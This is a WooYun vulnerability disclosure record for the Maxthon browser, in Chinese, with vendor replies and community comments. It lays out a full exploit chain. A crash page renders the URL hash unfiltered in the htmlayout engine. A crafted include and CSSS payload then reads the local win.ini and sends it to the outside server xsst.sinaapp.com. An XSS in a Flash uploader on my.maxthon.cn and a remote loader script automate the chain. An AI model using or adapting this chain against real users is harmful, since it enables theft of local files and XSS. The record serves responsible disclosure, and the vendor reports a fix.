{"id": 47196, "wybug_id": "wooyun-2014-081919", "wybug_title": "傲游浏览器：从鸡肋报错到本地信息读取", "wybug_corp": "傲游", "wybug_author": "gainover", "wybug_date": "2014-11-04 00:32", "wybug_open_date": "2015-02-02 00:34", "wybug_type": "用户敏感数据泄漏", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["浏览器漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-02：\t细节向公众公开  简要描述： 百度浏览器还不更新，只能玩玩其它浏览器啦。测试某API时发现多运行几次就会报错，七捣鼓八弄弄，发现还可以读取本地文件耶～～  详细说明：  1. 对傲游的特权域以及一些API代表何种功能做了一定研究，研究到以下API时，根据猜测填入参数后，发现运行并无反应：（测试在 http://i.maxthon.cn/域下，在控制台里进行）\nvar x=new maxthon.browser.TabService();x.openTabWithHistoryList([\"http://www.baidu.com\"]);\n2. 然而，当我猜测性的，给数组里加入一个 null时，页面竟然刷新啦，代码如下：\nvar x=new maxthon.browser.TabService();x.openTabWithHistoryList([\"http://www.baidu.com\",null]);\n3. 当我多次在控制台里运行上面代码，比如2个null,3个null后，发现偶尔会出现以下报错信息：\n\n4. 经过反复测试后，与null数量并没关系，只要反复运行【步骤2】中的代码3次，浏览器就会出现以上崩溃错误信息。5. 但这仅仅是一个崩溃，而且浏览器捕获到了这个异常，并没有影响到浏览器的正常运行。但是，页面中的网址 http://i.maxthon.cn/ 引起了我的注意：如果我们让崩溃发生在 http://i.maxthon.cn/#<img src=1 onerror=alert(1)>， 会不会有XSS呢？6. 我们试试，在 http://i.maxthon.cn/#<img src=1 onerror=alert(1)> 执行【步骤2】代码3次，得到下面的结果：\n\n由上图可以看出，看来确实没有过滤HTML标签，显示了一个小图片，但是alert(1)并没有被执行。7. 第一个念头是：难道这里会做出富文本过滤？ 但是一想应该不太可能在这种位置使用《富文本过滤》策略这种繁琐的方案。那alert(1)去哪了呢？ 于是，我将代码稍微改变了一下，\nhttp://i.maxthon.cn/#<img src=http://www.x.com/1 onerror=alert(1)>\n同【步骤6】进行测试，并开启charles进行抓包，得到以下请求：\n\n8. 这个特殊的User-agent：htmlayout 3.3; Windows-7; www.terrainformatica.com )好像意味着什么。。经过打开百度浏览器上GOOGLE搜素htmlayout，发现这个htmlayout是一个基于HTML的界面库,其渲染引擎为H-smile，如下图所示（图片来源：http://www.terrainformatica.com/wiki/start#htmlayout）：\n\n9. 由于是独立的渲染引擎，这也意味着在HTML标签以及脚本的支持上与我们常见的webkit等内核是存在差异的，因此我下载了一个htmlayout的sdk，并查阅了其所支持的HTML标签及一些功能。10. 由于htmlayout主要用于界面显示，它支持绝大部分常见的HTML标签以及CSS样式，并且对HTML标签和CSS做了扩展，比如以下是它所特有的HTML标签(http://www.terrainformatica.com/htmlayout/tags.whtm)，例如include和widget标签：\nA. include 标签，可以包含子页面htm，有点类似现在的一些HTM模板引擎,典型代码如下：<include src=\"document-fragment.html\">    <em>Ooops! document-fragment.html is unavailable!</em></include>\n\nB. widget 标签，类似一个功能性的<div>标签, 支持4种不同的type<widget type=\"select\"> - select block element;<widget type=\"dropdown-select\"> - dropdown select block element;<widget type=\"textarea\"> - textarea block element;<widget type=\"htmlarea\"> - htmlarea block element.\nHTMLlayout本身不支持脚本（Sciter支持），但其支持一种被称为CSSS的技术，CSSS是被扩展的CSS，可以在CSS内完成一些简单脚本的编写，这类脚本主要与界面的展现有关，而不太具有很强的功能性，比如下面这样的一段代码（当鼠标移动到a标签上时，会触发 hover-on! 内的脚本，让p .slave标签的hover状态也打开，从而显示为红色）：\n<html>  <head>    <style>      a      {        hover-on!: $(p.slave):hover = true;        hover-off!: $(p.slave):hover = false;        border:1px solid;      }      p.slave:hover      {        color:red;      }    </style>  </head><body>  <a>Hover me!</a>  <p .slave>Slave</p></body></html>\n10. 那么基于上面这些，能否带来安全问题呢？这才是我们最为关心的。想要达到执行命令的目的似乎不太可能，因为并没有相关的标签或API可以实现这个目的。但是退而求其次，读取本地文件呢？于是，我在本地首先测试 <include>标签是否可以包含本地的文件，例如：\n<include src=\"file:///c:\\windows\\win.ini\" />\n发现可以正常包含进来，如下图所示：\n\n接着我们要怎么样将这些内容发送到【攻击者】的服务器上呢？经常弄XSS的我们，不难想到利用 new Image().src=\"http://hacker.com/?敏感数据\" 的方式来进行数据传输。但是前面已说，htmlayout不支持JS，然而它却支持 csss。经过对csss的语法进行分析后，我们可以写出以下代码，让页面将include 进来的内容 经由图片的src属性发送出去，代码如下：\n<body><widget #test type=\"htmlarea\"><include src=\"file:///c:\\windows\\win.ini\" /></widget><img #xx src=\"11\" /><style>widget#test > text{\tassigned!:$1(img#xx).src=\"http://www.baidu.com/?\"+self:value;color:red;}</style></body>\n其中CSSS代码的含义是，当id=\"test\"的widget中文本被赋予内容时，将id=\"xx\"的img的src属性设置为\"http://www.baidu.com/\"加上被赋予的内容。于是，抓包可以看到如下图所示请求：\n\n------------------------------------------------------------11. 综上所述，我们要利用这个漏洞，需要先访问以下地址：\nhttp://i.maxthon.cn/#<body><widget #test type=\"htmlarea\"><include src=\"file:///c:\\windows\\win.ini\" /></widget><img #xx src=\"11\" /><style>widget#test > text{assigned!:$1(img#xx).src=\"http://xsst.sinaapp.com/?\"+self:value;color:red;}</style></body>\n然后在该地址下面执行三次：\nvar x=new maxthon.browser.TabService();x.openTabWithHistoryList([\"http://www.baidu.com\",null]);\n然后浏览器崩溃，执行上面的代码，将用户本地的 win.ini 发送至我们的服务器 http://xsst.sinaapp.com12. 为了将以上过程自动化，我们首先需要找到 maxthon.cn 域下的一个XSS，这个不是难事：\nhttp://my.maxthon.cn//public/images/swfupload.swf?preventswfcaching=1414769360525&movieName=aaa\"])}catch(e){alert(1)}//\n接着我们，要让这个页面自动执行3次openTabWithHistoryList，利用代码如下，第一次将代码存入window.name，随后，我们将代码放入cookies中，页面调用openTabWithHistoryList，自动重启后，从cookies中读取利用代码并再次执行，利用代码放在了http://192.168.1.13/mx/poc1.js中，\n<script>window.name='document.cookie=\"payload='+escape('var s=document.createElement(\"script\");s.src=\"http://192.168.1.13/mx/poc1.js?\"+Math.random();document.body.appendChild(s);')+'; path=/; domain=maxthon.cn\";';location.href='http://my.maxthon.cn//public/images/swfupload.swf?preventswfcaching=1414769360525&movieName=aaa\"])}catch(e){if(!window.wy){window.wy=1;window.name%26%26eval(window.name);eval(unescape((document.cookie.match(/payload=([^;]%2b)/)||[0,0])[1]))}};//';</script>\n其中http://192.168.1.13/mx/poc1.js的代码如下：\n//将hash（#后的部分）改为我们崩溃后要使用的代码location.hash='<body><widget #test type=\"htmlarea\"><include src=\"file:///c:\\\\windows\\\\win.ini\" /></widget><img #xx src=\"11\" /><style>widget#test > text{assigned!:$1(img#xx).src=\"http://xsst.sinaapp.com/?\"+self:value;color:red;}</style></body>';//调用openTabWithHistoryList，三次后，页面将出现崩溃错误var x=new maxthon.browser.TabService();x.openTabWithHistoryList([\"http://www.baidu.com\",null]);\n13. 最终，我们只需要访问 poc 页面，利用openTabWithHistoryList函数的缺陷导致页面刷新三次后，出现崩溃错误，利用代码被执行，用户本地信息将被恶意窃取。   漏洞证明：  效果见视频：http://v.youku.com/v_show/id_XODE4MjE2MDcy.html视频密码： wooyuncmd2自己电脑: win7 64位 以及虚拟机xp 系统环境下傲游v4.4.2.2000下测试成功。   修复方案：  1. 崩溃原因未知，应该是可以修复的。2. 崩溃之后，页面显示的url地址进行编码后输出。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-11-04 10:20 厂商回复： 感谢报告，马上进行修复 最新状态： 2014-11-05：已修复  ", "replys": "漏洞评价：\n评论\n     2014-11-04 00:52 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  顶二哥，前排- -     \n     2014-11-04 01:04 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  目测，又会出肥皂剧    \n     2014-11-04 07:26 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  最近是浏览器连续剧的节奏啊    \n     2014-11-04 07:31 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n   开始玩浏览器了    \n     2014-11-04 07:49 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  二哥准备把浏览器全部玩烂么    \n     2014-11-04 08:34 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  又可以省2个月房租了，吼吼。你应该试试360浏览器    \n     2014-11-04 08:58 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  变废为宝，醉了...    \n     2014-11-04 09:24 |    \t\t疯狂的dabing \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:9        | Hehe is golden.)\t\t \n  你关注的白帽子 gainover 发表了漏洞 傲游浏览器：从鸡肋报错到本地信息读取    \n     2014-11-04 09:25 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  二哥，你。。。    \n     2014-11-04 10:01 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  也许。。。这就是它自己留的后门~你们太坏了~让人家怎么方便取cookie，怎么推送广告，怎以赚钱！！    \n     2014-11-04 10:52 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  呵呵一下，一个特权域的xss(可导致诸如浏览历史记录的泄露)，一个htmlayout下的本地信息读取(可导致本地信息泄露)，还有一个api的crash，才给5分。。。前面看blast自评5分的需要用户点击安装提示的插件安装接口，你们却打了15分(本漏洞特权域下的这个xss可以实现同样的效果)，请问你们真的懂自家浏览器的安全问题么？    \n     2014-11-04 11:16 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @gainover  他们一直都给5分的。明显不在乎，下次有问题直接发drops吧，哈哈~    \n     2014-11-04 11:25 |    \t\tSogili \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:27        )\t\t \n  @gainover 哈哈，没法原谅。    \n     2014-11-04 15:44 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  @gainover 其实他是想先从5分给起，这样你就要发15个漏洞了。。。    \n     2014-11-04 18:23 |    \t\t橘子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 呢个...羞射高中生一枚。带上大神@Haswell...)\t\t \n  是HOME页的呢个么...    \n     2014-11-04 18:50 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  。。。低：5分    \n     2014-11-05 01:24 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  @only_guest 为什么我有点害怕你的机智了^_^    \n     2014-11-07 12:22 |    \t\t乌云合作伙伴-知道创宇(乌云厂商)\t\t \n  htmlayout 下这个突破非常nice 顶     \n     2014-11-07 12:37 |    \t\t乌云合作伙伴-知道创宇(乌云厂商)\t\t \n  http://www.terrainformatica.com/tiscript/main.whtm @gainover 这个没发直接搞？    \n     2014-11-07 12:42 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @乌云合作伙伴-知道创宇 “Sciter combines H-SMILE core engine and TIScript into single entity。” （http://www.terrainformatica.com/wiki/start#sciter）； 应该是 Sciter 才结合了 H-SMILE和 TIScript，而 Htmlayout 不支持 TIScript。    \n     2015-02-02 10:52 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  PKAV的大神果然流弊。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}